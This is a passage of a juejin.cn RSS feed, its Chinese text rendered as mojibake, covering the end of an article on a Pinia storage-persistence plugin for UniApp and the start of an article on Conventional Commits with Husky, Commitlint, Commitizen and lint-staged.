<li><strong>åˆå§‹æ¢å¤ï¼ˆåŒæ­¥è¯»ï¼‰</strong>ï¼šæ’ä»¶ä½¿ç”¨ <code>uni.getStorageSync</code> åŒæ­¥è¯»å–æ•°æ®ã€‚è¿™ä¿è¯äº†åœ¨ç»„ä»¶æŒ‚è½½å‰ï¼ŒStore çš„çŠ¶æ€å·²ç»æ˜¯æœ€ç»ˆç»“æœï¼Œ<strong>é¿å…äº†ç•Œé¢é—ªçƒ</strong>ã€‚</li>
<li><strong>çŠ¶æ€ä¿å­˜ï¼ˆå¼‚æ­¥å†™ï¼‰</strong>ï¼šå½“çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ’ä»¶é»˜è®¤ä½¿ç”¨ <code>uni.setStorage</code> å¼‚æ­¥ä¿å­˜ï¼Œå¹¶åˆ©ç”¨ <code>post</code> æ¨¡å¼å»¶è¿Ÿæ‰§è¡Œï¼Œ<strong>é¿å…é¢‘ç¹ IO é˜»å¡ä¸»çº¿ç¨‹</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ›¡ï¸ å¢å¼ºçš„åºåˆ—åŒ–æ”¯æŒ</strong></p>
<ul>
<li>å¼€å‘ä¸­éš¾å…ä¼šç”¨åˆ°ç‰¹æ®Šç±»å‹ã€‚æœ¬æ’ä»¶å†…ç½®äº†è‡ªå®šä¹‰åºåˆ—åŒ–æ–¹æ³•ï¼Œæ”¯æŒä»¥ä¸‹ç±»å‹çš„è‡ªåŠ¨è½¬æ¢ï¼š
<ul>
<li><strong>Date</strong>ï¼šè‡ªåŠ¨è¿˜åŸä¸ºæ—¥æœŸå¯¹è±¡ã€‚</li>
<li><strong>BigInt</strong>ï¼šè‡ªåŠ¨è½¬å­˜ï¼Œä¸æŠ¥é”™ã€‚</li>
<li><strong>å¾ªç¯å¼•ç”¨</strong>ï¼šèƒ½å®‰å…¨å¤„ç†å¯¹è±¡é—´çš„å¾ªç¯å¼•ç”¨ï¼Œé˜²æ­¢ç¨‹åºå´©æºƒã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>âš–ï¸ å­˜å‚¨ä½“ç§¯ç›‘æµ‹</strong></p>
<ul>
<li>è€ƒè™‘åˆ°å°ç¨‹åºå•æ¡ç¼“å­˜é€šå¸¸é™åˆ¶ä¸º 1MBï¼Œæ’ä»¶ä¼šåœ¨éç”Ÿäº§ç¯å¢ƒä¸‹ç›‘æµ‹å­˜å‚¨å¤§å°ã€‚å¦‚æœå•æ¡æ•°æ®è¶…è¿‡ <strong>3.5MB</strong>ï¼Œä¼šåœ¨æ§åˆ¶å°è¾“å‡ºè­¦å‘Šï¼Œå¸®åŠ©å¼€å‘è€…åŠæ—©å‘ç°éšæ‚£ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ§© çµæ´»é…ç½®</strong></p>
<ul>
<li>æ”¯æŒæŒ‰éœ€æŒä¹…åŒ–ï¼ˆ<code>paths</code> è¿‡æ»¤ï¼‰ã€‚</li>
<li>æ”¯æŒè‡ªå®šä¹‰å­˜å‚¨ Key å’Œå‰ç¼€ã€‚</li>
<li>æ”¯æŒ TypeScript ç±»å‹æç¤ºã€‚</li>
</ul>
</li>
</ol>
<hr/>
<hr/>
<h3 data-id="heading-2">ğŸ“¦ å®‰è£…</h3>
<p>æ¨èä½¿ç”¨ pnpmï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add pinia-plugin-uni-persist-next
</code></pre>
<p>æˆ–è€… yarn/npmï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn add pinia-plugin-uni-persist-next
<span class="hljs-comment"># npm install pinia-plugin-uni-persist-next</span>
</code></pre>
<hr/>
<h3 data-id="heading-3">ğŸ› ï¸ å¿«é€Ÿä¸Šæ‰‹</h3>
<h4 data-id="heading-4">1. æ³¨å†Œæ’ä»¶</h4>
<p>åœ¨ä½ çš„ <code>main.ts</code> æˆ– <code>index.ts</code> ä¸­å¼•å…¥å¹¶å®‰è£…æ’ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createSSRApp } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;
<span class="hljs-keyword">import</span> { createUniPersistPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia-plugin-uni-persist-next"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./App.vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);
  <span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>();

  <span class="hljs-comment">// 1. åˆ›å»ºæ’ä»¶å®ä¾‹</span>
  <span class="hljs-keyword">const</span> uniPersist = <span class="hljs-title function_">createUniPersistPlugin</span>({
    <span class="hljs-attr">keyPrefix</span>: <span class="hljs-string">"my_app_"</span>, <span class="hljs-comment">// å¯é€‰ï¼šç»™æ‰€æœ‰ key åŠ ä¸Šç»Ÿä¸€å‰ç¼€</span>
  });

  <span class="hljs-comment">// 1. æ³¨å†Œåˆ° pinia</span>
  pinia.<span class="hljs-title function_">use</span>(uniPersist);

  app.<span class="hljs-title function_">use</span>(pinia);
  <span class="hljs-keyword">return</span> { app, <span class="hljs-title class_">Pinia</span>: pinia };
}
</code></pre>
<h4 data-id="heading-5">2. åœ¨ Store ä¸­å¼€å¯</h4>
<p>å°±åƒæŒ‰å¼€å…³ä¸€æ ·ç®€å•ï¼Œåœ¨ Store é‡ŒåŠ è¿™å‡ è¡Œä»£ç å°±è¡Œï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"user"</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">token</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">userInfo</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"æµ·ç»µå®å®"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">10</span> },
    <span class="hljs-attr">loginTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(), <span class="hljs-comment">// ç›´æ¥å­˜ Date ç±»å‹ï¼</span>
  }),
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">setToken</span>(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = token;
    },
  },
  <span class="hljs-comment">// âœ¨ æ­¤å¤„å¼€å¯æŒä¹…åŒ–</span>
  <span class="hljs-attr">persist</span>: {
    <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  },
});
</code></pre>
<p>æå®šï¼ç°åœ¨å°±ç®—ä½ åˆ·æ–°é¡µé¢ï¼Œæˆ–è€…æ€æ‰ App é‡å¯ï¼Œ<code>token</code> ä¾ç„¶åœ¨ï¼Œè€Œä¸” <code>loginTime</code> å–å‡ºæ¥è¿˜æ˜¯ <code>Date</code> å¯¹è±¡ï¼Œä¸ç”¨ä½ è‡ªå·±è½¬ã€‚</p>
<hr/>
<h3 data-id="heading-6">âš™ï¸ è¿›é˜¶ç”¨æ³•ï¼ˆæ»¡è¶³ä½ çš„æ§åˆ¶æ¬²ï¼‰</h3>
<h4 data-id="heading-7">åœºæ™¯ä¸€ï¼šæ•°æ®å¤ªå¤šï¼Œæˆ‘åªæƒ³å­˜ä¸€éƒ¨åˆ†</h4>
<p>æ¯”å¦‚ <code>userInfo</code> å¾ˆé•¿ï¼Œæˆ‘åªæƒ³å­˜ä¸ª <code>token</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>], <span class="hljs-comment">// æŒ‡å®šåå•ï¼šåªå­˜ token</span>
    },
  ],
}
</code></pre>
<h4 data-id="heading-8">åœºæ™¯äºŒï¼šæˆ‘æƒ³æ¢ä¸ªå­˜å‚¨ Key</h4>
<p>é»˜è®¤ Key æ˜¯ Store çš„ IDï¼ˆæ¯”å¦‚ä¸Šé¢çš„ <code>user</code>ï¼‰ï¼Œæ€•è·Ÿåˆ«äººçš„ key æ’è½¦ï¼Ÿæ”¹å®ƒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">key</span>: <span class="hljs-string">'my_auth_cache'</span>, <span class="hljs-comment">// æœ€ç»ˆåœ¨ Storage é‡Œå°±æ˜¯ "my_auth_cache"</span>
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>],
    },
  ],
}
</code></pre>
<h3 data-id="heading-9">ğŸ” æŠ€æœ¯åŸç†ï¼ˆç»™å¥½å¥‡å®å®ï¼‰</h3>
<h4 data-id="heading-10">ä¸ºä»€ä¹ˆè¯´å®ƒâ€œè¯»å†™åˆ†ç¦»â€ä½“éªŒæœ€å¥½ï¼Ÿ</h4>
<p>æˆ‘ä»¬çœ‹ä¸ªä¼ªä»£ç å¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ğŸ”µ å¯åŠ¨ APP æ—¶ï¼ˆè¯»ï¼‰ï¼šå¿…é¡»åŒæ­¥ï¼</span>
<span class="hljs-comment">// å¦‚æœè¿™é‡Œç”¨å¼‚æ­¥ï¼Œé¡µé¢å…ˆæ˜¾ç¤º"æœªç™»å½•"ï¼Œ0.1ç§’åå˜æˆ"å·²ç™»å½•"ï¼Œç”¨æˆ·ä¼šçœ‹åˆ°ç•Œé¢é—ªçƒã€‚</span>
<span class="hljs-comment">// æ‰€ä»¥æ’ä»¶å¼ºåˆ¶ä½¿ç”¨ getStorageSyncï¼Œä¿è¯é¡µé¢æ¸²æŸ“å‰æ•°æ®å°±åˆ°ä½äº†ã€‚</span>
<span class="hljs-keyword">const</span> data = uni.<span class="hljs-title function_">getStorageSync</span>(key);
store.$patch(data);

<span class="hljs-comment">// ğŸŸ  è¿è¡Œæ—¶ï¼ˆå†™ï¼‰ï¼šå¿…é¡»å¼‚æ­¥ï¼</span>
<span class="hljs-comment">// æ¯”å¦‚ç”¨æˆ·åœ¨æ»‘åŠ¨åˆ—è¡¨æ—¶è§¦å‘äº†çŠ¶æ€æ›´æ–°ï¼Œå¦‚æœè¿™æ—¶å€™åŒæ­¥å†™ç£ç›˜ï¼Œ</span>
<span class="hljs-comment">// JS çº¿ç¨‹å¡ä½ç­‰å¾… IOï¼Œç”¨æˆ·å°±ä¼šæ„Ÿè§‰æ»‘åŠ¨â€œæ‰å¸§â€å¡é¡¿ã€‚</span>
<span class="hljs-comment">// æ‰€ä»¥æ’ä»¶é»˜è®¤ä½¿ç”¨ setStorageï¼ˆå¼‚æ­¥ï¼‰ï¼Œå¹¶åœ¨åå°æ‚„æ‚„ä¿å­˜ã€‚</span>
store.$subscribe(<span class="hljs-function">() =&gt;</span> {
  uni.<span class="hljs-title function_">setStorage</span>({ key, data });
});
</code></pre>
<h4 data-id="heading-11">ä¸ºä»€ä¹ˆå®ƒæ¯” JSON.stringify æ›´å¼ºï¼Ÿ</h4>
<p>åŸç”Ÿçš„ <code>JSON.stringify</code> å¾ˆå‚»ï¼Œé‡åˆ° <code>Date</code> å˜æˆå­—ç¬¦ä¸²ï¼Œé‡åˆ° <code>BigInt</code> æŠ¥é”™ï¼Œé‡åˆ°å¾ªç¯å¼•ç”¨ç›´æ¥å´©ã€‚</p>
<p>æœ¬æ’ä»¶å†…éƒ¨å°è£…äº†ä¸€å¥— <code>safeStringify</code>ï¼š</p>
<ul>
<li>é‡åˆ° <strong>Date</strong> -&gt; æ ‡è®°ä¸ºæ—¥æœŸ -&gt; è¯»å–æ—¶è‡ªåŠ¨å˜å› Date</li>
<li>é‡åˆ° <strong>BigInt</strong> -&gt; è½¬å­—ç¬¦ä¸²å­˜ -&gt; ä¿è¯ä¸æŠ¥é”™</li>
<li>é‡åˆ° <strong>å¾ªç¯å¼•ç”¨</strong> -&gt; è‡ªåŠ¨åˆ‡æ–­ -&gt; ä¿è¯ä¸å´©æºƒ</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<strong>ä½ å¯ä»¥æ”¾å¿ƒåœ°æŠŠä»»ä½•æ•°æ®å¾€ Pinia é‡Œä¸¢ï¼Œå‰©ä¸‹çš„äº¤ç»™æ’ä»¶ã€‚</strong></p>
<hr/>
<h3 data-id="heading-12">ğŸ“ æ€»ç»“</h3>
<p><code>pinia-plugin-uni-persist-next</code> å°±åƒæ˜¯ç»™ä½ çš„ UniApp åŠ ä¸Šäº†ä¸€ä¸ª<strong>ç¨³å›ºçš„åå‹¤è¡¥ç»™ç«™</strong>ã€‚</p>
<ul>
<li>å®ƒ<strong>å¾ˆè½»</strong>ï¼šä¸å ä»€ä¹ˆåŒ…ä½“ç§¯ã€‚</li>
<li>å®ƒ<strong>å¾ˆå¼º</strong>ï¼šDateã€BigIntã€å¾ªç¯å¼•ç”¨ç»Ÿç»Ÿæå®šã€‚</li>
<li>å®ƒ<strong>å¾ˆæ»‘</strong>ï¼šè¯»å†™åˆ†ç¦»è®¾è®¡ï¼Œç»ä¸æ‹–æ…¢ UI çº¿ç¨‹ã€‚</li>
</ul>
<p>å¦‚æœä½ è¿˜åœ¨ä¸º UniApp çš„æ•°æ®æŒä¹…åŒ–å¤´ç–¼ï¼Œæˆ–è€…å¿å—ç€æ—§æ–¹æ¡ˆçš„å¡é¡¿ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ªæ–°æ–¹æ¡ˆï¼</p>
<blockquote>
<p><strong>ğŸ”— GitHub åœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHollelihanqi%2Fpinia-plugin-uni-persist-next" target="_blank" title="https://github.com/Hollelihanqi/pinia-plugin-uni-persist-next" ref="nofollow noopener noreferrer">github.com/Hollelihanqâ€¦</a><br/>
è§‰å¾—å¥½ç”¨çš„è¯ï¼Œæ±‚ä¸ª Star â­ï¸ï¼ä½ çš„æ”¯æŒæ˜¯æˆ‘æ›´æ–°çš„åŠ¨åŠ›ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»]]></title>    <link>https://juejin.cn/post/7592789801708273705</link>    <guid>https://juejin.cn/post/7592789801708273705</guid>    <pubDate>2026-01-08T07:41:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708273705" data-draft-id="7592540388298997823" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»"/> <meta itemprop="keywords" content="å‰ç«¯,ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-08T07:41:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="paradeå²æœˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179639113831"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179639113831/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    paradeå²æœˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:41:01.000Z" title="Thu Jan 08 2026 07:41:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬è§„èŒƒåŸºäº <code>Conventional Commits</code> æ€æƒ³ï¼Œé…åˆ <code>husky + commitlint + commitizen/cz-* + lint-staged</code> å·¥å…·é“¾ï¼Œåœ¨å›¢é˜Ÿå†…ç»Ÿä¸€æäº¤å†å²çš„å¯è¯»æ€§ä¸å¯ç»´æŠ¤æ€§ã€‚</p>
<ul>
<li>è§„èŒƒå®šä¹‰ï¼šæäº¤ä¿¡æ¯æ€ä¹ˆå†™ï¼ˆæ‰€æœ‰äººéƒ½éµå®ˆï¼‰</li>
<li>å·¥å…·ä¿éšœï¼šæœ¬åœ°æäº¤æ—¶è‡ªåŠ¨æ ¡éªŒï¼ˆå°½é‡å°‘é â€œè®°ä½è§„åˆ™â€ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-0">0. æ¦‚å¿µä¸å·¥å…·ç®€ä»‹</h2>
<p>è¿™ä¸€èŠ‚ç”¨äºå¿«é€Ÿç†è§£â€œä¸ºä»€ä¹ˆè¦åšè¿™äº›çº¦æŸâ€ä»¥åŠâ€œæ¯ä¸ªå·¥å…·å„è‡ªè´Ÿè´£ä»€ä¹ˆâ€ã€‚</p>
<h3 data-id="heading-1">0.1 Conventional Commitsï¼ˆæäº¤è§„èŒƒæ€æƒ³ï¼‰</h3>
<p><code>Conventional Commits</code> æ˜¯ä¸€å¥—çº¦å®šå¼çš„æäº¤ä¿¡æ¯æ ¼å¼ï¼Œç”¨ç»“æ„åŒ–çš„ <code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</code> æ¥è¡¨è¾¾å˜æ›´æ„å›¾ï¼Œå¸¦æ¥çš„æ”¶ç›ŠåŒ…æ‹¬ï¼š</p>
<ul>
<li>æäº¤å†å²æ›´å¯è¯»ï¼Œä»£ç å®¡æŸ¥æ›´é«˜æ•ˆ</li>
<li>ä¾¿äºæŒ‰ç±»å‹ç”Ÿæˆå˜æ›´æ—¥å¿—ï¼ˆChangelogï¼‰</li>
<li>ä¾¿äºè‡ªåŠ¨åŒ–æµç¨‹ï¼ˆå‘å¸ƒã€ç‰ˆæœ¬å·ã€å›æ»šå®šä½ï¼‰</li>
</ul>
<h3 data-id="heading-2">0.2 Git Hookï¼ˆGit é’©å­ï¼‰</h3>
<p>Git Hook æ˜¯ Git åœ¨å…³é”®åŠ¨ä½œå‘ç”Ÿæ—¶è§¦å‘è„šæœ¬çš„æœºåˆ¶ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨å®¢æˆ·ç«¯é’©å­ï¼š</p>
<ul>
<li><code>pre-commit</code>ï¼šåœ¨å†™å…¥ commit ä¹‹å‰æ‰§è¡Œï¼Œå¸¸ç”¨äºä»£ç æ£€æŸ¥/æ ¼å¼åŒ–/æµ‹è¯•</li>
<li><code>commit-msg</code>ï¼šåœ¨å†™å…¥ commit message ä¹‹åã€æœ€ç»ˆè½åº“ä¹‹å‰æ‰§è¡Œï¼Œå¸¸ç”¨äºæ ¡éªŒæäº¤ä¿¡æ¯æ ¼å¼</li>
</ul>
<h3 data-id="heading-3">0.3 Huskyï¼ˆHook ç®¡ç†ï¼‰</h3>
<p><code>husky</code> ç”¨æ¥æŠŠ hook ä»¥å¯ç»´æŠ¤çš„æ–¹å¼æ”¾è¿›ä»“åº“ï¼ˆé€šå¸¸åœ¨ <code>.husky/</code> ç›®å½•ï¼‰ï¼Œè®©å›¢é˜Ÿæˆå‘˜åœ¨æœ¬åœ° <code>git commit</code> æ—¶è‡ªåŠ¨è§¦å‘åŒä¸€å¥—è„šæœ¬ã€‚</p>
<h3 data-id="heading-4">0.4 Commitlintï¼ˆæäº¤ä¿¡æ¯æ ¡éªŒï¼‰</h3>
<p><code>commitlint</code> ç”¨æ¥æ ¡éªŒ commit message æ˜¯å¦æ»¡è¶³è§„åˆ™ï¼ˆä¾‹å¦‚ type æ˜¯å¦åœ¨å…è®¸åˆ—è¡¨ã€header é•¿åº¦é™åˆ¶ç­‰ï¼‰ã€‚å®ƒé€šå¸¸æŒ‚åœ¨ <code>commit-msg</code> hook ä¸Šï¼Œä¸é€šè¿‡å°±ä¸­æ­¢æäº¤ã€‚</p>
<h3 data-id="heading-5">0.5 Commitizen ä¸é€‚é…å™¨ï¼ˆäº¤äº’å¼ç”Ÿæˆï¼‰</h3>
<p><code>commitizen</code> æä¾›äº¤äº’å¼é—®ç­”æ¥ç”Ÿæˆ commit messageï¼Œé™ä½â€œé è®°å¿†æ‰‹å†™è§„èŒƒâ€çš„æˆæœ¬ã€‚</p>
<ul>
<li><code>commitizen</code> æœ¬èº«æ˜¯å¹³å°ï¼Œéœ€è¦é…ç½®ä¸€ä¸ªé€‚é…å™¨ï¼ˆadapterï¼‰</li>
<li>å¸¸è§é€‚é…å™¨ï¼š<code>cz-conventional-changelog</code>ï¼ˆç»å…¸ã€æœ€å°ä¾èµ–ï¼‰ã€<code>cz-git</code>ï¼ˆæ›´çµæ´»ï¼Œå¯æ‰©å±•ä¸­æ–‡/emoji ç­‰ï¼‰</li>
<li>å‘½ä»¤ï¼š<code>git-cz</code>ï¼ˆä»¥åŠç­‰ä»·çš„ <code>cz</code>ï¼‰</li>
</ul>
<h3 data-id="heading-6">0.6 Lint-stagedï¼ˆåªæ£€æŸ¥æš‚å­˜åŒºæ–‡ä»¶ï¼‰</h3>
<p><code>lint-staged</code> ä¼šè‡ªåŠ¨è·å– Git æš‚å­˜åŒºï¼ˆstagedï¼‰çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶åªå¯¹è¿™äº›æ–‡ä»¶è¿è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œé¿å…æ¯æ¬¡æäº¤éƒ½å…¨é‡ lintã€‚</p>
<h3 data-id="heading-7">0.7 å®ƒä»¬å¦‚ä½•åä½œï¼ˆä¸€æ¬¡æäº¤çš„æ‰§è¡Œé¡ºåºï¼‰</h3>
<p>å½“ä½ æ‰§è¡Œ <code>git commit</code> æ—¶ï¼Œé€šå¸¸ä¼šæŒ‰ä»¥ä¸‹é¡ºåºå‘ç”Ÿï¼š</p>
<ol start="0">
<li><code>pre-commit</code>ï¼šè¿è¡Œ <code>lint-staged</code>ï¼ˆå¯¹æš‚å­˜åŒºæ–‡ä»¶åšæ ¡éªŒ/æ ¼å¼åŒ–ï¼‰</li>
<li>ç¼–è¾‘/ç”Ÿæˆ commit messageï¼šæ‰‹å†™æˆ–ä½¿ç”¨ <code>commitizen</code></li>
<li><code>commit-msg</code>ï¼šè¿è¡Œ <code>commitlint</code>ï¼ˆæ ¡éªŒ commit messageï¼‰</li>
<li>é€šè¿‡åæäº¤è½åº“</li>
</ol>
<hr/>
<h2 data-id="heading-8">1. Commit Message ç»Ÿä¸€æ ¼å¼ï¼ˆå¿…é¡»ï¼‰</h2>
